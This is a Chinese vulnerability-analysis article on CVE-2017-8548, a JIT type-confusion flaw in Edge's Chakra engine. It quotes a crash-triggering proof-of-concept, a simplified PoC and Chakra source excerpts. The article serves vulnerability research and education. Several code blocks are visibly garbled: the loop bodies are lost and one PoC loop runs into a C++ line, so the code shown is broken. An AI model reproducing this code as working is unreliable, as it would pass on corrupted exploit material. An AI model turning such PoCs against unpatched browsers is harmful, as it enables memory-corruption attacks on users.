# 【漏洞分析】对Edge浏览器的js解析引擎Chakra漏洞CVE-2017-8548的分析
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
作者：[Ox9A82](http://bobao.360.cn/member/contribute?uid=2676915949)
预估稿费：1000RMB
**（本篇文章享受双倍稿费 活动链接请**[ **点击此处**](http://bobao.360.cn/news/detail/4370.html)
**）**
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**简介**
这是Microsoft
Edge的javascript解析引擎Chakra的一个漏洞。这篇分析也是我这系列分析中的一部分，这一系列的漏洞虽然成因各有不同，但是我个人觉得在挖掘问题的思路上是一脉相承的。
这个漏洞与之前的几个相比比较特殊的是涉及到了代码的JIT，也就是发生了优化导致的问题。 此外这也是一个 **微软修了两次才修好的漏洞**
，韩国神童lokihardt第一次在16年12月经project zero上报了这个漏洞，编号为 **CVE-2017-0071**
。之后微软进行了错误的修补lokihardt在17年6月份再次上报了这个漏洞编号为 **CVE-2017-8548** 。
**漏洞概况**
lokihardt提供的POC如下
    'use strict';
    function func(a, b, c) {
        a[0] = 1.2;
        b[0] = c;
        a[1] = 2.2;
        a[0] = 2.3023e-320;
    }
    function main() {
        let a = [1.1, 2.2];
        let b = new Uint32Array(100);
        for (let i = 0; i  {
            a[0] = {};
            return 0;
        }});
        a[0].toString();
    }
    main();
执行POC后crash情况如下
    return Merge(FromObject(RecyclableObject::FromVar(var)));
    //其中var=0x1234,对0x1234转换RecyableObject导致crash
初步观察POC可以得知，func()被反复执行导致JIT，之后对JIT函数调用了用户定义的callback函数。
**漏洞调试**
首先简化POC进行调试，简化后POC如下：
    function func(a, b, c) {
    a[0] = 2.3023e-320;
    b[0] = c;
        a[0] = 2.3023e-320;
    }
    let a = [1.1];
    let b = new Uint32Array(100);
    for (let i = 0; i TrySetNativeFloatArrayItem(value, &dValue);
            if (typeId == TypeIds_NativeFloatArray)
            {
                this->SetItem(index, dValue);
            }
            else
            {
                this->DirectSetItemAt(index, value);
            }
            return TRUE;
        }
注意这个函数首先调用 **TrySetNativeFloatArrayItem** 。然后根据返回结果的Type_Id不同调用不同的赋值函数。
当返回的TypeId是NativeFloatArray时，调用 **JavascriptNativeFloatArray::SetItem**
当返回的TypeId是JavascriptArray时，调用 **JavascriptArray::DirectSetItemAt **
而负责判断值类型的函数 **JavascriptNativeFloatArray::TrySetNativeFloatArrayItem**